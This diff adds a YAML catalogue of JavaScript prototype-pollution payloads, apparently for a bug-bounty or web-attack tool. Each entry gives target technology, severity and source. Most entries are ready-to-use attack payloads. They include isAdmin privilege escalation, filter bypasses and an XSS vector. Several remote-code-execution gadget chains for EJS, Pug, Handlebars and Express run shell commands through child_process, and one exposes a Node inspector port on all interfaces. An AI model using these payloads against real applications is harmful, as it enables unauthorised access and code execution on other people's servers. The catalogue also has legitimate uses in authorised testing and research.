@@ -1,0 +1,218 @@
+id: prototype_pollution
+name: Prototype Pollution
+version: 1.0.0
+category: injection
+description: |
+  JavaScript prototype-pollution payloads that mutate Object.prototype via
+  unsafe recursive merge/clone routines or query-string parsers. Covers both
+  server-side (Node) and DOM-side (client) vectors plus common gadget chains.
+mitre:
+  - T1190
+owasp_top10:
+  - A08:2021
+references:
+  - https://portswigger.net/web-security/prototype-pollution
+  - https://github.com/BlackFan/client-side-prototype-pollution
+  - https://github.com/HoLyVieR/prototype-pollution-nsec18
+related_tools:
+  - nuclei
+  - ppmap
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: ssp_proto_admin
+    name: Server-side __proto__.isAdmin
+    subcategory: server_side
+    encoding: raw
+    tech_targets: [node, express]
+    severity_when_works: critical
+    payload: |
+      {"__proto__": {"isAdmin": true}}
+    notes: For apps that recursively merge user JSON onto session
+    source: https://portswigger.net/web-security/prototype-pollution
+  - id: ssp_proto_polluted
+    name: Server-side __proto__.polluted marker
+    subcategory: server_side
+    encoding: raw
+    tech_targets: [node]
+    severity_when_works: high
+    payload: |
+      {"__proto__": {"polluted": "yes"}}
+    notes: Detection marker
+    source: common knowledge
+  - id: ssp_constructor_prototype
+    name: constructor.prototype pollution
+    subcategory: server_side
+    encoding: raw
+    tech_targets: [node]
+    severity_when_works: high
+    payload: |
+      {"constructor": {"prototype": {"polluted": "yes"}}}
+    notes: Bypass naive __proto__ filters
+    source: https://github.com/BlackFan/client-side-prototype-pollution
+  - id: ssp_querystring
+    name: Query-string proto pollution
+    subcategory: server_side
+    encoding: raw
+    tech_targets: [node, express, qs]
+    severity_when_works: critical
+    payload: __proto__[admin]=true
+    notes: Works with qs library; also try __proto__.admin=true
+    source: https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/
+  - id: ssp_querystring_dot
+    name: Query-string dot notation
+    subcategory: server_side
+    encoding: raw
+    tech_targets: [node, express]
+    severity_when_works: high
+    payload: __proto__.admin=true
+    notes: null
+    source: common knowledge
+  - id: ssp_constructor_qs
+    name: constructor.prototype querystring
+    subcategory: server_side
+    encoding: raw
+    tech_targets: [node, express]
+    severity_when_works: high
+    payload: constructor[prototype][admin]=true
+    notes: null
+    source: common knowledge
+  - id: rce_shell_unix
+    name: child_process gadget chain
+    subcategory: rce_gadget
+    encoding: raw
+    tech_targets: [node]
+    severity_when_works: critical
+    payload: |
+      {"__proto__": {"shell": "/bin/sh", "argv0": "node", "env": {"NODE_OPTIONS": "--inspect=0.0.0.0:9229"}}}
+    notes: Mass-assign child_process.spawn options
+    source: https://blog.p6.is/Web-Security-CTF-Writeups/#hxp-CTF-2021-includer-s-revenge
+  - id: rce_argv0
+    name: argv0 override gadget
+    subcategory: rce_gadget
+    encoding: raw
+    tech_targets: [node]
+    severity_when_works: critical
+    payload: |
+      {"__proto__": {"argv0": "node -e require('child_process').exec('id')"}}
+    notes: Triggered when downstream spawns a child
+    source: https://blog.p6.is/
+  - id: rce_main_main
+    name: main override gadget
+    subcategory: rce_gadget
+    encoding: raw
+    tech_targets: [node]
+    severity_when_works: critical
+    payload: |
+      {"__proto__": {"main": "/etc/passwd"}}
+    notes: When require() resolves polluted main field
+    source: common knowledge
+  - id: ejs_outputFunctionName
+    name: EJS outputFunctionName gadget
+    subcategory: rce_gadget
+    encoding: raw
+    tech_targets: [node, ejs]
+    severity_when_works: critical
+    payload: |
+      {"__proto__": {"outputFunctionName": "x; require('child_process').exec('id'); var y"}}
+    notes: EJS render gadget; see CVE-2022-29078
+    source: https://eslam.io/posts/ejs-server-side-prototype-pollution-gadgets-to-rce/
+  - id: pug_compileDebug
+    name: Pug compileDebug gadget
+    subcategory: rce_gadget
+    encoding: raw
+    tech_targets: [node, pug]
+    severity_when_works: critical
+    payload: |
+      {"__proto__": {"compileDebug": true, "self": true, "line": "process.mainModule.require('child_process').exec('id')"}}
+    notes: Pug template gadget
+    source: https://blog.p6.is/Web-Security-CTF-Writeups/#hxp-CTF-2021-includer-s-revenge
+  - id: handlebars_helperMissing
+    name: Handlebars helperMissing gadget
+    subcategory: rce_gadget
+    encoding: raw
+    tech_targets: [node, handlebars]
+    severity_when_works: critical
+    payload: |
+      {"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":0,"params":[{"type":"NumberLiteral","value":"process.mainModule.require('child_process').execSync('id')"}],"loc":{"start":0,"end":0}}]}}
+    notes: AST pollution for handlebars
+    source: https://blog.p6.is/
+  - id: client_location_hash
+    name: Client-side via location.hash
+    subcategory: client_side
+    encoding: raw
+    tech_targets: [browser]
+    severity_when_works: high
+    payload: "#__proto__[innerHTML]=<img src=x onerror=alert(1)>"
+    notes: When hash is parsed into options object
+    source: https://github.com/BlackFan/client-side-prototype-pollution
+  - id: client_jquery_extend
+    name: jQuery extend pollution
+    subcategory: client_side
+    encoding: raw
+    tech_targets: [browser, jquery]
+    severity_when_works: high
+    payload: |
+      $.extend(true, {}, JSON.parse('{"__proto__":{"polluted":"yes"}}'))
+    notes: Pre-3.4.0 vulnerable
+    source: https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/
+  - id: client_lodash_merge
+    name: lodash _.merge pollution
+    subcategory: client_side
+    encoding: raw
+    tech_targets: [browser, node, lodash]
+    severity_when_works: high
+    payload: |
+      _.merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'))
+    notes: Affects lodash <4.17.12
+    source: https://snyk.io/vuln/SNYK-JS-LODASH-450202
+  - id: nested_constructor
+    name: Nested constructor chain
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [node]
+    severity_when_works: high
+    payload: |
+      {"constructor": {"constructor": {"prototype": {"polluted": "yes"}}}}
+    notes: For deep recursive merge filters
+    source: common knowledge
+  - id: array_proto
+    name: Array prototype pollution
+    subcategory: server_side
+    encoding: raw
+    tech_targets: [node]
+    severity_when_works: high
+    payload: |
+      {"length": 0, "__proto__": {"map": "x"}}
+    notes: Pollute Array.prototype.map
+    source: common knowledge
+  - id: numeric_props
+    name: Numeric prop pollution
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [node]
+    severity_when_works: medium
+    payload: |
+      {"__proto__": {"0": "polluted"}}
+    notes: Some checks reject string keys but allow numeric
+    source: common knowledge
+  - id: detection_marker_get
+    name: Detection via /?__proto__
+    subcategory: detection
+    encoding: raw
+    tech_targets: [node, browser]
+    severity_when_works: low
+    payload: /?__proto__[polluted]=yes
+    notes: Use ppmap-style detection to confirm
+    source: common knowledge
+  - id: render_engine_view
+    name: Express render view gadget
+    subcategory: rce_gadget
+    encoding: raw
+    tech_targets: [node, express]
+    severity_when_works: critical
+    payload: |
+      {"__proto__": {"view options": {"client": true, "escapeFunction": "process.mainModule.require('child_process').execSync('id')"}}}
+    notes: When res.render reads polluted view options
+    source: https://github.com/CalfCrusher/HTB-CrackMeIfYouCan/
